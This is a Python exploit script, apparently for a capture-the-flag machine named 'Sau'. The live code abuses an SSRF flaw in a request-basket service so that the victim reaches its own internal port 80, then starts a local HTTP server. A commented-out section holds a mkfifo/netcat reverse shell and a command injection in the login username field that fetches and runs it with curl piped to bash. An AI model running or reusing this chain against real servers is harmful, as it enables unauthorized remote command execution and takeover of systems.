import atexit
import string
import random
import subprocess
import requests
import signal
import sys
import os
import threading
import time
import argparse
from ping3 import ping

parser = argparse.ArgumentParser(description="Programa para configurar conexiones.")
parser.add_argument('-rhost', '--remote-host', dest='victim_ip', required=True, help="Ip of the sau machiene.")
parser.add_argument('-lhost', '--local-hot', dest='attacker_ip', required=True, help="Your ip.")
parser.add_argument('-lport', '--local-port', dest='attacker_port', type=int, required=True,
                    help="Port for your nc listener.")
args = parser.parse_args()

victim = args.victim_ip
attacker = args.attacker_ip
nc_port = args.attacker_port

sau_web_service_port = "55555"
localhost = "127.0.0.1"
url_vulnerable_service = f"http://{victim}:{sau_web_service_port}/"
ssrf_url = f"http://{victim}:{sau_web_service_port}/api/baskets/"
payload = f"http://{localhost}:80/"  # According to nmap port 80 is filtered. That means the firewall is blocking por 80. Which means it could be some web service.

range_basket_name = 10
http_server = None


def kill_processes():
    print("Attempting to kill server...")
    if http_server and http_server.poll() is None:
        time.sleep(4)
        http_server.terminate()
        http_server.wait()
        print("Server killed")



def exit_handler(signum, frame):
    sys.exit(1)


def check_vpn_connection(target_ip, timeout):
    try:
        response_time = ping(target_ip, timeout=timeout)
        if response_time is not None:
            print(f"Target IP is reachable with a response time of {response_time} ms.")
        else:
            print("Target IP is not reachable.")
            sys.exit(1)
    except OSError:
        print("Target " + str(target_ip) + " is not reachable. Make sure you are connected to the VPN.")
        sys.exit(1)


def create_basket():
    # choose from all lowercase letter
    letters = string.ascii_lowercase
    basket_name = ''.join(random.choice(letters) for i in range(range_basket_name))

    # We need to provide to the fordward_url the ip we want to call.
    data = {
        "forward_url": f"{payload}",
        "proxy_response": True,
        "insecure_tls": False,
        "expand_path": True,
        "capacity": 250
    }

    try:
        r = requests.request(method="POST", url=ssrf_url + basket_name, json=data)
        r.raise_for_status()
        print("Request successful")
        print(r.status_code)
        print(r.text)
    except requests.exceptions.Timeout:
        print(
            "Request timed out. The server didn't respond within the specified time. Make sure you are connected to the vpn.")
    except requests.exceptions.RequestException as e:
        print("An error occurred:", e)


# if r.status_code == 201:
#     res = requests.request(method="GET", url=url_vulnerable_service + basket_name)
# if r.status_code == 200:
# print(f"Web service found inside {victim} -> {localhost}:80")
#
# nc_thread = threading.Thread(target=os.system, args=[f"nc -lvnp {nc_port}"])
# nc_thread.start()
# nc_thread.join(timeout=1)
#
# server_thread = threading.Thread(target=os.system, args=[f"python -m http.server 8003"])
# server_thread.start()
#
# time.sleep(1)
#
# os.system(f"echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {attacker} {nc_port} >/tmp/f' > rev.sh | chmod +x rev.sh")
# attack_thread = threading.Thread(target=os.system, args=[f"curl {url_vulnerable_service}{basket_name}/login --data 'username=;`curl http://{attacker}:8003/rev.sh | bash`'"])
# attack_thread.start()
# print("Trying to explote...")
#
# attack_thread.join(timeout=10)
#
# os.system("kill $(lsof -i :8003 | grep LISTEN | awk '{print $2}')")
# os.system("rm rev.sh")

if __name__ == '__main__':
    # Program flow control
    atexit.register(kill_processes)
    signal.signal(signal.SIGINT, exit_handler)

    # start the connection
    create_basket()

    http_server = subprocess.Popen(["python3", "-m", "http.server", "8003"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
